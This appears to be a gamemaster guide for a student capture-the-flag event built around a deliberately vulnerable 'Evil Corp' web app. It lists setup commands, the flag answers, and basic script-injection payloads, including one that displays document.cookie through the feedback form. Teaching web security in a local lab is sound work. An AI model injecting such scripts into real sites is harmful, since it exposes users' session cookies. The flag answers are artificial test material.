# 🔴 Evil Corp CTF — XSS Edition | Gamemaster Guide

GenCyber Hackathon 2026 | UA Little Rock

---

## Quick Setup

### Requirements
- Node.js (v18 or newer)
- A laptop on the same network as players

### Steps
```bash
git clone https://github.com/YOUR_USERNAME/evil-corp-xss.git
cd evil-corp-xss
npm install
npm start
```

Find your local IP:
- **Windows**: `ipconfig` → IPv4 Address
- **Mac/Linux**: `ifconfig` → inet address

Tell players: `http://YOUR_IP:3000`

---

## The 2 Flags + Bonus

| # | Flag | Location | How |
|---|------|----------|-----|
| 1 | `FLAG{robots_dont_lie}` | `/robots.txt` | Visit robots.txt directly in browser |
| 2 | `FLAG{xss_scripts_are_powerful}` | Alert popup | Submit `<script>alert('FLAG{xss_scripts_are_powerful}')</script>` in the feedback name field |
| 🎁 Bonus | `FLAG{cookies_are_not_just_snacks}` | Browser cookie | Submit `<script>alert(document.cookie)</script>` in feedback form |

---

## Intended Player Flow

```
1. Visit Evil Corp landing page
2. Find robots.txt → FLAG 1 + hint about /onboarding.html
3. Read the XSS training on the onboarding page
4. Click through to /feedback.html
5. Use XSS payload in the name or message field → FLAG 2 pops up
6. Use document.cookie payload → BONUS FLAG pops up
```

## XSS Payloads That Work

**FLAG 2** — paste into name or message field:
```
<script>alert('FLAG{xss_scripts_are_powerful}')</script>
```

**Bonus Flag** — paste into name or message field:
```
<script>alert(document.cookie)</script>
```

---

## Hints To Give Players

- **Stuck finding login page**: "Have you checked what the server doesn't want you to see?"
- **Stuck on XSS**: "The training told you exactly what to type. Read it again carefully."
- **Stuck on bonus**: "The training mentioned something JavaScript can steal from the browser..."

---

*Arkansas GenCyber Strength Training Program | Hackathon 2026*
